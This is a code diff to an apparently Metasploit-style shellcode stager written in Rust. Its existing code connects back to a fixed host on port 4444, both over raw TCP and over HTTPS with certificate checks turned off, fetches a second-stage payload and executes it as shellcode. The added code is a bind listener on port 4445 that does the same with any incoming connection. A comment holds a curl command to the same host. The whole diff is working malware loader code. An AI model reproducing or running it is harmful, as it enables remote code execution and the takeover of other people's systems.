@@ -5,7 +5,7 @@ use byteorder::{BigEndian, ReadBytesExt};
 use std::io::Cursor;
 use std::{error::Error, u32};
 use tokio::io::AsyncReadExt;
-use tokio::net::TcpStream;
+use tokio::net::{TcpStream, TcpListener};
 async fn reverse_tcp(address: &str) -> Result<(), Box<dyn Error>> {
     let mut stream = TcpStream::connect("192.168.142.141:4444").await?;
     let mut stage2_len_buf = [0u8; 4];
@@ -23,6 +23,48 @@ async fn reverse_tcp(address: &str) -> Result<(), Box<dyn Error>> {
     println!("before do shellcode");
     do_shellcode(stage2_buf);
     println!("after do shellcode");
+    Ok(())
+}
+
+async fn handle_tcp(stream: &mut TcpStream) -> Result<(), Box<dyn Error>> {
+    let mut stage2_len_buf = [0u8; 4];
+    stream.read_exact(&mut stage2_len_buf).await?;
+    dbg!(stage2_len_buf);
+    let stage2_len = u32::from_le_bytes(stage2_len_buf);
+    dbg!(stage2_len);
+
+    let mut stage2_buf = vec![0u8; stage2_len as usize];
+    stream.read_exact(&mut stage2_buf).await?;
+
+    println!("got stage2 len: {}", stage2_buf.len());
+
+    // drop(stream);
+    // drop(listener);
+    // execute shellcode
+    println!("before do shellcode");
+    do_shellcode(stage2_buf);
+    println!("after do shellcode");
+    Ok(())
+}
+
+async fn bind_tcp() -> Result<(), Box<dyn Error>> {
+    let listener = TcpListener::bind("0.0.0.0:4445").await?;
+    loop {
+        println!("listening.......");
+        let (mut stream, _) = listener.accept().await?;
+
+        println!("got connection....");
+        tokio::spawn(async move {
+            // tracing::debug!("accepted connection");
+            if let Err(e) = handle_tcp(&mut stream).await {
+                println!("err: {:?}", e);
+            }
+            // if let Err(e) = process(state, stream, addr).await {
+            //     // tracing::info!("an error occurred; error = {:?}", e);
+            // }
+        });
+
+    }
     Ok(())
 }
 
@@ -51,17 +93,23 @@ fn gen_uri_checksum(length: u32) -> String {
         }
     }
 }
-
+use std::time::Duration;
 // GET /BE-mOx_33owBzADOYdIneQQKsFrLVyLmiEfQbEaPs1N1fm8p5UCxoI2fblNIw89ErU9br1bHL3KOyzfvEjZo792JrTaeFgu1zrPyenLV0I9wnYcsSclH4bsJ5q-3TsxEgdCcJGbgQHAi8X5V-k_j--jJbGXfqTDS3OlGa1h67HaYU92_QeM6-OlI7GQX8 HTTP/1.1
 // curl http://192.168.142.141:4444/BE-mOx_33owBzADOYdIneQQKsFrLVyLmiEfQbEaPs1N1fm8p5UCxoI2fblNIw89ErU9br1bHL3KOyzfvEjZo792JrTaeFgu1zrPyenLV0I9wnYcsSclH4bsJ5q-3TsxEgdCcJGbgQHAi8X5V-k_j--jJbGXfqTDS3OlGa1h67HaYU92_QeM6-OlI7GQX8
 async fn reverse_http() -> Result<(), Box<dyn Error>> {
     //  # Choose a random URI length between 30 and 255 bytes
     // lib\msf\core\payload\windows\x64\reverse_http_x64.rb#L109
     let checksum = gen_uri_checksum(30);
-    let url = concat!("http://192.168.142.141:4444", "/").to_owned();
+    let url = concat!("https://192.168.142.141:4444", "/").to_owned();
     let url = format!("{}{}", url, checksum);
     dbg!(&url);
-    let body = reqwest::get(&url).await?.bytes().await?;
+    let five_seconds = Duration::new(5, 0);
+    let client = reqwest::ClientBuilder::new().timeout(five_seconds).danger_accept_invalid_certs(true).build()?;
+    // client;
+
+
+    // .danger_disable_hostname_verification().build().unwrap();
+    let body = client.get(&url).send().await?.bytes().await?;
     let stage2_buf = body;
 
     println!("reverse_http, got stage2 len: {}", stage2_buf.len());
@@ -74,7 +122,8 @@ async fn reverse_http() -> Result<(), Box<dyn Error>> {
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error>> {
     // reverse_tcp("").await?;
-    reverse_http().await?;
+    // reverse_http().await?;
+    bind_tcp().await?;
     return Ok(());
 }
 
